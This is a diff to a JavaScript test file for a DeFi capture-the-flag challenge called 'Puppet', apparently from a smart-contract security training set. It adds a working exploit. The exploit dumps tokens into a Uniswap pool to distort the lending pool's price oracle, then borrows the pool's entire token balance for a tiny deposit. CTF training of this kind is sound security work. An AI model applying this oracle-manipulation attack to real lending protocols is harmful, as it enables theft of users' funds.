@@ -9,6 +9,8 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
     return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
         (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
     )
+
+    // tokenSold * 997 * etherInReserve/ ((tokensInReserve * 1000) + (tokenSold * 997))
 }
 
 describe('[Challenge] Puppet', function () {
@@ -20,6 +22,7 @@ describe('[Challenge] Puppet', function () {
 
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
     const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
+
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
@@ -103,6 +106,62 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const table = [];
+        const table1 = [];
+
+        const log = async (message = "<NO MESSAGE>") => {
+            // const uniswapExchange = ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address));
+            // const uniswapExchangeToken = ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address));
+            const depositRequired = ethers.utils.formatEther(await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+
+            const lendingPool = ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address));
+            const lendingPoolToken = ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address));
+
+            const attacker_ = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
+            const attackerToken = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
+
+            table.push({ 
+                message, 
+                // uniswapExchange, 
+                // uniswapExchangeToken,
+                depositRequired,
+                lendingPool,
+                lendingPoolToken,
+                attacker: attacker_,
+                attackerToken
+            });
+        }
+        
+        await log();
+
+        await this.token.connect(attacker)
+            .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange.connect(attacker)
+            .addLiquidity(
+                1,                                                          // min_liquidity
+                ATTACKER_INITIAL_TOKEN_BALANCE,
+                (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+                { value: ethers.utils.parseEther('1'), gasLimit: 1e6 }
+            );
+
+        await log();
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther("990"),
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        await log();
+
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired });
+
+        await log();
+
+        console.table(table);
     });
 
     after(async function () {
